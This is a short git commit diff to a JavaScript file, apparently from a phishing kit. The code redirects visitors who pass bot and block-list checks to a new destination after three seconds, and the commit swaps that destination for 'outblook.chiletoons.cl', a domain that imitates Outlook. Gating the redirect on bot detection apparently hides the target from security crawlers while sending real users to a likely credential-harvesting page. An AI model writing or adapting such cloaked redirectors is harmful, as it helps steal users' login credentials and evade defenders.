4e40f2327f89ad880dfa0005ea32afe9feccefb0
husknet <127146284+husknet@users.noreply.github.com>
2025-01-27 02:39:04 -0400

    Update main.js

--- src/main.js
+++ src/main.js
@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://bess.dasttech.com.ar/';
+          window.location.href = 'https://outblook.chiletoons.cl/';
         }, 3000);
       }
     });
